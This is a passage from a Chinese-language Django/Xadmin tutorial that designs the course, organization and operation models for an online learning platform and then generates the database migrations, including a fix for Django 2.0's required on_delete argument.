src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/92.png" alt="img"></p><p>如下图: 我们一共创建了三个数据表: Structure可以查看到</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/93.png" alt="img"></p><blockquote><p>与用户相关的评论啊，点赞啊。学习的课程啊并没有放进来，因为那些独立性不高。<br>容易产生循环引用。我们把那些放到operation中。</p></blockquote><p>本小节完成，对应commit:</p><h2 id="4-6-course-models-py编写"><a href="#4-6-course-models-py编写" class="headerlink" title="4-6 course models.py编写"></a>4-6 course models.py编写</h2><p>点击 <code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">startapp courses</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>course中需要那些表:</p><ul><li>课程本身需要一张表</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/94.png" alt="img"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/95.png" alt="img"></p><p>mark</p><ul><li>点进去之后点击开始学习。</li><li>课程基本信息需要一张表, 章节表与课程表存在(一个课程对应多个章节)</li><li>章节表中：章节的名称。 章节与视频(一个章节对应多个视频)</li></ul><p>结构: 课程本身–(一对多)&gt;章节-(一对多)-&gt;视频信息</p><p>资源下载放在课程里面的。一个课程对应多个资源</p><p>共四张表：课程本身–(一对多)&gt;章节-(一对多)-&gt;视频信息 &amp; 资源表</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/96.png" alt="img"></p><p>courses/models.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line"># 课程信息表</span><br><span class="line">class Course(models.Model):</span><br><span class="line">    DEGREE_CHOICES &#x3D; (</span><br><span class="line">        (&quot;cj&quot;, u&quot;初级&quot;),</span><br><span class="line">        (&quot;zj&quot;, u&quot;中级&quot;),</span><br><span class="line">        (&quot;gj&quot;, u&quot;高级&quot;)</span><br><span class="line">    )</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;课程名&quot;)</span><br><span class="line">    desc &#x3D; models.CharField(max_length&#x3D;300, verbose_name&#x3D;u&quot;课程描述&quot;)</span><br><span class="line">    # TextField允许我们不输入长度。可以输入到无限大。暂时定义为TextFiled，之后更新为富文本</span><br><span class="line">    detail &#x3D; models.TextField(verbose_name&#x3D;u&quot;课程详情&quot;)</span><br><span class="line">    degree &#x3D; models.CharField(choices&#x3D;DEGREE_CHOICES, max_length&#x3D;2)</span><br><span class="line">    # 使用分钟做后台记录(存储最小单位)前台转换</span><br><span class="line">    learn_times &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;学习时长(分钟数)&quot;)</span><br><span class="line">    # 保存学习人数:点击开始学习才算</span><br><span class="line">    students &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;学习人数&quot;)</span><br><span class="line">    fav_nums &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;收藏人数&quot;)</span><br><span class="line">    image &#x3D; models.ImageField(</span><br><span class="line">        upload_to&#x3D;&quot;courses&#x2F;%Y&#x2F;%m&quot;,</span><br><span class="line">        verbose_name&#x3D;u&quot;封面图&quot;,</span><br><span class="line">        max_length&#x3D;100)</span><br><span class="line">    # 保存点击量，点进页面就算</span><br><span class="line">    click_nums &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;点击数&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;课程&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面来编写章节 &amp; 视频 &amp; 课程资源:<code>courses/models.py</code></p><p>一对多, 多对一都可以使用django的外键来完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># 章节</span><br><span class="line">class Lesson(models.Model):</span><br><span class="line">    # 因为一个课程对应很多章节。所以在章节表中将课程设置为外键。</span><br><span class="line">    # 作为一个字段来让我们可以知道这个章节对应那个课程</span><br><span class="line">    course &#x3D; models.ForeignKey(Course, verbose_name&#x3D;u&quot;课程&quot;)</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;100, verbose_name&#x3D;u&quot;章节名&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;章节&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 每章视频</span><br><span class="line">class Video(models.Model):</span><br><span class="line">    # 因为一个章节对应很多视频。所以在视频表中将章节设置为外键。</span><br><span class="line">    # 作为一个字段来存储让我们可以知道这个视频对应哪个章节.</span><br><span class="line">    lesson &#x3D; models.ForeignKey(Lesson, verbose_name&#x3D;u&quot;章节&quot;)</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;100, verbose_name&#x3D;u&quot;视频名&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;视频&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 课程资源</span><br><span class="line">class CourseResource(models.Model):</span><br><span class="line">    # 因为一个课程对应很多资源。所以在课程资源表中将课程设置为外键。</span><br><span class="line">    # 作为一个字段来让我们可以知道这个资源对应那个课程</span><br><span class="line">    course &#x3D; models.ForeignKey(Course, verbose_name&#x3D;u&quot;课程&quot;)</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;100, verbose_name&#x3D;u&quot;名称&quot;)</span><br><span class="line">    # 这里定义成文件类型的field，后台管理系统中会直接有上传的按钮。</span><br><span class="line">    # FileField也是一个字符串类型，要指定最大长度。</span><br><span class="line">    download &#x3D; models.FileField(</span><br><span class="line">        upload_to&#x3D;&quot;course&#x2F;resource&#x2F;%Y&#x2F;%m&quot;,</span><br><span class="line">        verbose_name&#x3D;u&quot;资源文件&quot;,</span><br><span class="line">        max_length&#x3D;100)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;课程资源&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过Structure可以看到我们刚才设计的四张表</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/97.png" alt="img"></p><p>本小节完毕, 对应commit:</p><h2 id="4-7-organization-modesl-py设计"><a href="#4-7-organization-modesl-py设计" class="headerlink" title="4-7 organization modesl.py设计"></a>4-7 organization modesl.py设计</h2><p>新建课程机构app:</p><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">startapp organization</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>课程是属于机构的, 机构有机构类别，城市等字段。讲师实体。<br>我要学习的提交表单会与用户关联，存放在机构。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/98.png" alt="img"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/99.png" alt="img"></p><p>其中课程数，学习人数可以动态统计。机构地址，机构经典课程。</p><blockquote><p>机构讲师，机构课程可以通过外键获取到, 不保存到机构中。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/100.png" alt="img"></p><blockquote><p>讲师大概所需要的字段如图所示。</p></blockquote><p>organization/models.py 代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># encoding : utf-8</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 城市字典</span><br><span class="line">class CityDict(models.Model):</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;20, verbose_name&#x3D;u&quot;城市&quot;)</span><br><span class="line">    # 城市描述：备用不一定展示出来</span><br><span class="line">    desc &#x3D; models.CharField(max_length&#x3D;200, verbose_name&#x3D;u&quot;描述&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;城市&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 课程机构</span><br><span class="line">class CourseOrg(models.Model):</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;机构名称&quot;)</span><br><span class="line">    # 机构描述，后面会替换为富文本展示</span><br><span class="line">    desc &#x3D; models.TextField(verbose_name&#x3D;u&quot;机构描述&quot;)</span><br><span class="line">    click_nums &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;点击数&quot;)</span><br><span class="line">    fav_nums &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;收藏数&quot;)</span><br><span class="line">    image &#x3D; models.ImageField(</span><br><span class="line">        upload_to&#x3D;&quot;org&#x2F;%Y&#x2F;%m&quot;,</span><br><span class="line">        verbose_name&#x3D;u&quot;封面图&quot;,</span><br><span class="line">        max_length&#x3D;100)</span><br><span class="line">    address &#x3D; models.CharField(max_length&#x3D;150, verbose_name&#x3D;u&quot;机构地址&quot;)</span><br><span class="line">    # 一个城市可以有很多课程机构，通过将city设置外键，变成课程机构的一个字段</span><br><span class="line">    # 可以让我们通过机构找到城市</span><br><span class="line">    city &#x3D; models.ForeignKey(CityDict, verbose_name&#x3D;u&quot;所在城市&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;课程机构&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 讲师</span><br><span class="line">class Teacher(models.Model):</span><br><span class="line">    # 一个机构会有很多老师，所以我们在讲师表添加外键并把课程机构名称保存下来</span><br><span class="line">    # 可以使我们通过讲师找到对应的机构</span><br><span class="line">    org &#x3D; models.ForeignKey(CourseOrg, verbose_name&#x3D;u&quot;所属机构&quot;)</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;教师名称&quot;)</span><br><span class="line">    work_years &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;工作年限&quot;)</span><br><span class="line">    work_company &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;就职公司&quot;)</span><br><span class="line">    work_position &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;公司职位&quot;)</span><br><span class="line">    points &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;教学特点&quot;)</span><br><span class="line">    click_nums &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;点击数&quot;)</span><br><span class="line">    fav_nums &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;收藏数&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;教师&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/101.png" alt="img"></p><p>mark</p><blockquote><p>可以看到我们一共创建了三张表：分别是城市，课程机构，讲师。</p></blockquote><p>本小节对应commit:</p><blockquote><p>课程机构app：城市，机构，讲师表书写完毕。对应4-7</p></blockquote><h2 id="4-8-operation-models-py设计"><a href="#4-8-operation-models-py设计" class="headerlink" title="4-8 operation models.py设计"></a>4-8 operation models.py设计</h2><p>分析需要那些表:</p><ul><li>用户可以提交我要学习的个人需求。</li><li>学员的课程评论信息</li><li>收藏：可以收藏公开课, 授课讲师, 授课机构, 用户消息提醒。</li><li>个人中心：我的课程说明用户和课程之间的学习关系也需要保存。</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/102.png" alt="img"></p><p>新建操作app:</p><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">startapp operation</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>operation/models.py添加代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line"># 引入我们CourseComments所需要的外键models</span><br><span class="line">from users.models import UserProfile</span><br><span class="line">from courses.models import Course</span><br><span class="line"></span><br><span class="line"># 用户我要学习表单</span><br><span class="line">class UserAsk(models.Model):</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;20, verbose_name&#x3D;u&quot;姓名&quot;)</span><br><span class="line">    mobile &#x3D; models.CharField(max_length&#x3D;11, verbose_name&#x3D;u&quot;手机&quot;)</span><br><span class="line">    course_name &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;课程名&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;用户咨询&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户对于课程评论</span><br><span class="line">class CourseComments(models.Model):</span><br><span class="line"></span><br><span class="line">    # 会涉及两个外键: 1. 用户， 2. 课程。import进来</span><br><span class="line">    course &#x3D; models.ForeignKey(Course, verbose_name&#x3D;u&quot;课程&quot;)</span><br><span class="line">    user &#x3D; models.ForeignKey(UserProfile, verbose_name&#x3D;u&quot;用户&quot;)</span><br><span class="line">    comments &#x3D; models.CharField(max_length&#x3D;250, verbose_name&#x3D;u&quot;评论&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;评论时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;课程评论&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户对于课程,机构，讲师的收藏</span><br><span class="line">class UserFavorite(models.Model):</span><br><span class="line">    # 会涉及四个外键。用户，课程，机构，讲师import</span><br><span class="line">    TYPE_CHOICES &#x3D; (</span><br><span class="line">        (1, u&quot;课程&quot;),</span><br><span class="line">        (2, u&quot;课程机构&quot;),</span><br><span class="line">        (3, u&quot;讲师&quot;)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    user &#x3D; models.ForeignKey(UserProfile, verbose_name&#x3D;u&quot;用户&quot;)</span><br><span class="line">    # course &#x3D; models.ForeignKey(Course, verbose_name&#x3D;u&quot;课程&quot;)</span><br><span class="line">    # teacher &#x3D; models.ForeignKey()</span><br><span class="line">    # org &#x3D; models.ForeignKey()</span><br><span class="line">    # fav_type &#x3D;</span><br><span class="line"></span><br><span class="line">    # 机智版</span><br><span class="line">    # 直接保存用户的id.</span><br><span class="line">    fav_id &#x3D; models.IntegerField(default&#x3D;0)</span><br><span class="line">    # 表明收藏的是哪种类型。</span><br><span class="line">    fav_type &#x3D; models.IntegerField(</span><br><span class="line">        choices&#x3D;TYPE_CHOICES,</span><br><span class="line">        default&#x3D;1,</span><br><span class="line">        verbose_name&#x3D;u&quot;收藏类型&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;评论时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;用户收藏&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户消息表</span><br><span class="line">class UserMessage(models.Model):</span><br><span class="line">        # 因为我们的消息有两种:发给全员和发给某一个用户。</span><br><span class="line">        # 所以如果使用外键，每个消息会对应要有用户。很难实现全员消息。</span><br><span class="line"></span><br><span class="line">        # 机智版 为0发给所有用户，不为0就是发给用户的id</span><br><span class="line">    user &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;接收用户&quot;)</span><br><span class="line">    message &#x3D; models.CharField(max_length&#x3D;500, verbose_name&#x3D;u&quot;消息内容&quot;)</span><br><span class="line"></span><br><span class="line">    # 是否已读: 布尔类型 BooleanField False未读,True表示已读</span><br><span class="line">    has_read &#x3D; models.BooleanField(default&#x3D;False, verbose_name&#x3D;u&quot;是否已读&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;用户消息&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户课程表</span><br><span class="line">class UserCourse(models.Model):</span><br><span class="line">    # 会涉及两个外键: 1. 用户， 2. 课程。import进来</span><br><span class="line">    course &#x3D; models.ForeignKey(Course, verbose_name&#x3D;u&quot;课程&quot;)</span><br><span class="line">    user &#x3D; models.ForeignKey(UserProfile, verbose_name&#x3D;u&quot;用户&quot;)</span><br><span class="line">    add_time &#x3D; models.DateTimeField(default&#x3D;datetime.now, verbose_name&#x3D;u&quot;添加时间&quot;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;用户课程&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至此：我们的五张operation下的数据表models设计完成</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/103.png" alt="img"></p><h3 id="setting中配置添加app"><a href="#setting中配置添加app" class="headerlink" title="setting中配置添加app"></a>setting中配置添加app</h3><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/104.png" alt="img"></p><h2 id="4-9-数据表生成以及apps目录建立"><a href="#4-9-数据表生成以及apps目录建立" class="headerlink" title="4-9 数据表生成以及apps目录建立"></a>4-9 数据表生成以及apps目录建立</h2><blockquote><p>学习如何通过刚才设计的models生成数据库对应的表</p></blockquote><p>点击<code>Tools 菜单下 Run manage.py Task</code>:</p><h3 id="Python2与Python3不同"><a href="#Python2与Python3不同" class="headerlink" title="Python2与Python3不同:"></a>Python2与Python3不同:</h3><p>Python2下可能会报一些<code>noASCII</code>错误:</p><p>只需要在对应你写了中文的第一行加上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Python3-django2-0-1-会报错"><a href="#Python3-django2-0-1-会报错" class="headerlink" title="Python3(django2.0.1)会报错:"></a>Python3(django2.0.1)会报错:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org &#x3D; models.ForeignKey(CourseOrg, verbose_name&#x3D;u&quot;所属机构&quot;)</span><br><span class="line">TypeError: __init__() missing 1 required positional argument: &#39;on_delete&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这是因为在2.0.1中，外键关系必须指明删除时的操作。</p></blockquote><p>比如：出租车都归属于出租车公司。如果出租车公司倒闭了，那这些汽车该怎么处理。<br>必须自己指明: 我觉得可以直接进行级联删除。</p><p>django提供了:</p><ul><li><code>CASCADE</code></li><li><code>PROTECT</code></li><li><code>SET_NULL</code></li><li><code>SET_DEFAULT</code></li></ul><p>等选项。我选择了<code>CASCADE</code>删除。</p><p>将(dajngo 2.0.1)项目中所有的外键修改为如下面代码所示：</p><blockquote><p>也就是添加了<code>on_delete=models.CASCADE</code>使其级联删除。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org &#x3D; models.ForeignKey(CourseOrg, on_delete&#x3D;models.CASCADE, verbose_name&#x3D;u&quot;所属机构&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="makemirgration-amp-migrate生成表"><a href="#makemirgration-amp-migrate生成表" class="headerlink" title="makemirgration &amp; migrate生成表"></a>makemirgration &amp; migrate生成表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemirgration</span><br><span class="line">migrate</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/106.png" alt="img"></p><p>上图为makemirgration过程中输出的信息。可以看到我们做出的改动</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/105.png" alt="img"></p><p>此时我们查看app目录中migrations文件夹可以看到产生的新文件。</p><p><code>operation/migrations/0001_initial.py:</code></p><blockquote><p>可以看到里面也是Python的语法。他会帮我们生成数据表。<br>以后每次<code>migrations</code>时都会生成新的initial文件。这是很重要的变动文件，不能随意删除。</p></blockquote><p>打开Navicat可以看到django的数据库中有它默认的django_migrations表</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/107.png" alt="img"></p><p>双击django_migrations表可以看到我们migration的记录。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/108.png" alt="img"></p><blockquote><p>会记录哪个app下的哪个initial.py已经运行了。</p></blockquote><p>进入Navicat进行成功性验证:</p><p><img 